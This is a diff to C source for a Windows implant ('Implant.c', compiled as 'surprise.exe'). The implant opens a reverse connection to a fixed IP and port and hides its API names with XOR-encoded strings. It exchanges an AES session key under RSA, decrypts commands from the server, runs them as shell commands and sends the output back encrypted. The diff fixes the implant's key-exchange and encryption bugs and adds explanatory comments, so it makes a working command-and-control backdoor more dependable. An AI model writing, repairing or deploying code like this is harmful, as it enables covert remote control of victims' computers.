@@ -4,7 +4,9 @@
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
 int main()
 {
-    // Set variables
+    // Local buffers and obfuscated API string storage.
+    // rcvbuffer/sndbuffer: receive/send plaintext or ciphertext data.
+    // command, s_kernel, s_createproc, s_ws2_32: obfuscated strings decoded at runtime.
     char rcvbuffer[DEFAULT_BUFLEN];
     char sndbuffer[DEFAULT_BUFLEN];
     char command[] = {0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00};
@@ -19,9 +21,10 @@ int main()
     SOCKADDR_IN server;
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
-    int rsaUsed = 0;
+    int rsaUsed = 0; // track whether the RSA-encrypted AES key has been sent
 
-    // AES initialisation
+    // AES initialization: create an AES-GCM session key and prepare authenticated cipher parameters.
+    // pbSecret is a random 32-byte session key. nonce and tag are used for AES-GCM encryption/decryption.
     BCRYPT_ALG_HANDLE aesAlgorithm = NULL;
     BCRYPT_KEY_HANDLE aesKey = NULL;
     BYTE *pbKeyObject = NULL;
@@ -42,6 +45,7 @@ int main()
     authInfo.pbTag = tag;
     authInfo.cbTag = sizeof(tag);
 
+    // Open AES algorithm provider for AES-GCM operations
     status = BCryptOpenAlgorithmProvider(&aesAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
     {
@@ -75,7 +79,7 @@ int main()
         return 0;
     }
 
-    // Allow memory
+    // Allocate the BCrypt symmetric key object storage required by BCryptGenerateSymmetricKey.
     pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 
     if (pbKeyObject == NULL)
@@ -107,39 +111,21 @@ int main()
         return 0;
     }
 
-    // RSA initialisation
+    // RSA initialization: open RSA provider now, but receive the server public key blob after TCP connect.
+    // The public key blob will be used to import the server RSA public key and encrypt the AES session key.
     BCRYPT_ALG_HANDLE rsaAlgorithm = NULL;
     BCRYPT_KEY_HANDLE rsaKey = NULL;
-    BYTE *rsaPbinput = HeapAlloc(GetProcessHeap(), 0, 512);
-    ULONG rsaCbintput = sizeof(rsaPbinput);
+    BYTE *rsaPbinput = NULL;
+    ULONG rsaBlobLen = 0; // length of the RSA public key blob received from the server
     BYTE rsaEncrypted[512];
     ULONG rsaEncryptedLen = sizeof(rsaEncrypted);
     status = BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
     {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
-    status = BCryptImportKeyPair(
-        rsaAlgorithm,
-        NULL,
-        BCRYPT_RSAPUBLIC_BLOB,
-        &rsaKey,
-        rsaPbinput,
-        512,
-        0);
-
-
-    status = BCryptEncrypt(
-        rsaKey,
-        pbSecret,
-        cbSecret,
-        NULL,
-        NULL,
-        0,
-        rsaEncrypted,
-        sizeof(rsaEncrypted),
-        &rsaEncryptedLen,
-        BCRYPT_PAD_OAEP);
 
     char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
     char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
@@ -181,6 +167,8 @@ int main()
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("10.102.129.240");
 
+    // Establish TCP connection to the server before performing the RSA handshake.
+    // The server must send its public-key blob only after connection is established.
     if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0)
     {
         closesocket(soc);
@@ -188,9 +176,98 @@ int main()
         FreeLibrary(hWs2_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
         return 0;
     }
 
+    // Receive RSA public key blob length, then receive exactly that many bytes.
+    // This is the server's public key in BCrypt BLOB format.
+    if (recv_all(soc, (char *)&rsaBlobLen, sizeof(rsaBlobLen)) <= 0)
+    {
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
+        return 0;
+    }
+
+    rsaPbinput = HeapAlloc(GetProcessHeap(), 0, rsaBlobLen);
+    if (rsaPbinput == NULL)
+    {
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
+        return 0;
+    }
+
+    if (recv_all(soc, (char *)rsaPbinput, (int)rsaBlobLen) <= 0)
+    {
+        HeapFree(GetProcessHeap(), 0, rsaPbinput);
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
+        return 0;
+    }
+
+    status = BCryptImportKeyPair(
+        rsaAlgorithm,
+        NULL,
+        BCRYPT_RSAPUBLIC_BLOB,
+        &rsaKey,
+        rsaPbinput,
+        rsaBlobLen,
+        0);
+    if (!BCRYPT_SUCCESS(status))
+    {
+        HeapFree(GetProcessHeap(), 0, rsaPbinput);
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
+        return 0;
+    }
+
+    HeapFree(GetProcessHeap(), 0, rsaPbinput);
+    rsaPbinput = NULL;
+
+    status = BCryptEncrypt(
+        rsaKey,
+        pbSecret,
+        cbSecret,
+        NULL,
+        NULL,
+        0,
+        rsaEncrypted,
+        sizeof(rsaEncrypted),
+        &rsaEncryptedLen,
+        BCRYPT_PAD_OAEP);
+    if (!BCRYPT_SUCCESS(status))
+    {
+        BCryptDestroyKey(rsaKey);
+        closesocket(soc);
+        WSACleanup();
+        FreeLibrary(hWs2_32);
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
+        BCryptCloseAlgorithmProvider(rsaAlgorithm, 0);
+        return 0;
+    }
+
+    BCryptDestroyKey(rsaKey);
+    rsaKey = NULL;
+
+    // Main receive loop: receive encrypted command packets, decrypt them with AES-GCM, execute shell commands,
+    // and send the command output back encrypted after the first RSA-encrypted AES key response.
     FILE *pipe = NULL;
     int kill = 1;
     int checker;
@@ -205,13 +282,16 @@ int main()
                               ((unsigned char)rcvbuffer[1] << 8) |
                               ((unsigned char)rcvbuffer[2] << 16) |
                               ((unsigned char)rcvbuffer[3] << 24);
+        // Receive the encrypted command payload and decrypt it using AES-GCM.
+        // cmdlen is the binary ciphertext length, not a string length.
         recv_all(soc, received_message, cmdlen);
-        if (rsaUsed != 0){
-            decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
-                        rcvbuffer, sizeof(rcvbuffer), &cmdlen,
-                        tag, sizeof(tag), &authInfo);
+        if (rsaUsed != 0)
+        {
+            decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)cmdlen,
+                            rcvbuffer, sizeof(rcvbuffer), &cmdlen,
+                            tag, sizeof(tag), &authInfo);
         }
-        
+
         rcvbuffer[cmdlen] = '\0';
 
         if (rcvbuffer[0] == '#')
@@ -234,25 +314,29 @@ int main()
                 int send_result;
                 while (fgets(buf, sizeof(buf), pipe) != NULL)
                 {
-                    if (rsaUsed == 0){
-char header[4];
-header[0] = (char)(rsaEncryptedLen & 0xFF);
-header[1] = (char)((rsaEncryptedLen >> 8) & 0xFF);
-header[2] = (char)((rsaEncryptedLen >> 16) & 0xFF);
-header[3] = (char)((rsaEncryptedLen >> 24) & 0xFF);
+                    // On the first command response we send the RSA-encrypted AES session key.
+                    // Subsequent responses are encrypted with AES-GCM using the same AES session key.
+                    if (rsaUsed == 0)
+                    {
+                        char header[4];
+                        header[0] = (char)(rsaEncryptedLen & 0xFF);
+                        header[1] = (char)((rsaEncryptedLen >> 8) & 0xFF);
+                        header[2] = (char)((rsaEncryptedLen >> 16) & 0xFF);
+                        header[3] = (char)((rsaEncryptedLen >> 24) & 0xFF);
 
-send_all(soc, header, sizeof(header));
-send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
-rsaUsed++;
+                        send_all(soc, header, sizeof(header));
+                        send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
+                        rsaUsed = 1;
                     }
-                    else{
+                    else
+                    {
                         encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
-                                    result_buf, sizeof(result_buf), &ciphertext_len,
-                                    tag, sizeof(tag));
+                                        result_buf, sizeof(result_buf), &ciphertext_len,
+                                        tag, sizeof(tag));
 
-                    send_result = send_all(soc, result_buf, (int)strlen(result_buf));
+                        send_result = send_all(soc, result_buf, ciphertext_len);
                     }
-                    
+
                     // send_result = send(soc, buf, (int)strlen(buf), 0);
                     if (send_result <= 0)
                     {
